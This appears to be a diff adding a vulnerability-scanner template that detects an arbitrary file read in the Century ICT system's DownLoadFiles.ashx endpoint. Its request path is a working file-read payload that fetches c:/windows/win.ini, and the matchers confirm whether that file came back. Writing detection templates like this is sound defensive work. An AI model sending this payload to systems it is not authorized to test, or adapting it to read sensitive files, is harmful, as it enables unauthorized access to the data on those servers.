@@ -1,0 +1,31 @@
+id: poc-yaml-century-ict-downloadfiles-ashx-anyfile-read
+info:
+  name: Century ICT DownLoadFiles.ashx Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in Century ICT management system's DownLoadFiles.ashx endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/WeChatConfig/ashx/DownLoadFiles.ashx?filePath=c:/windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "; for 16-bit app support"
+          - "[files]"
+      - type: regex
+        part: header
+        regex:
+          - "filename=win\\.ini"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
